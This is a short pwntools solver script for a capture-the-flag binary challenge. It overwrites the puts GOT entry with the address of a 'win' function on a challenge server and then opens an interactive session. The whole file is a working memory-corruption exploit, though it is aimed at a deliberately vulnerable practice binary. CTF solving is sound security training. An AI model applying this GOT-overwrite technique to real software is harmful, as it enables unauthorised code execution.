#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("chall.0xfun.org", 26546)

    return r


def main():
    r = conn()

    puts_got = exe.got['puts']
    win_addr = exe.symbols['win']
    log.info(f"puts@GOT: {hex(puts_got)}")
    log.info(f"win:      {hex(win_addr)}")
    r.sendlineafter(b"Show me what you GOT!\n", str(puts_got).encode())
    r.sendlineafter(b"what you GOT!\n", str(win_addr).encode())

    r.interactive()


if __name__ == "__main__":
    main()
